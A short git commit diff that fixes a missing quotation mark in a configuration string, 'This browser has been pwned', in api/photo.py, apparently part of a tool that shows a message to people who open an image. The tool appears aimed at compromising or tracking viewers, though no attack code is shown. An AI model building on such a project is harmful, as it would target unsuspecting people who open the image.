50687be448e802930f9edd78677d18269938c010
sbp <imaboylol8@gmail.com>
2025-02-01 18:17:19 +0100

    Update photo.py

--- api/photo.py
+++ api/photo.py
@@ -28,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned, # Message to show
+        "message": "This browser has been pwned", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
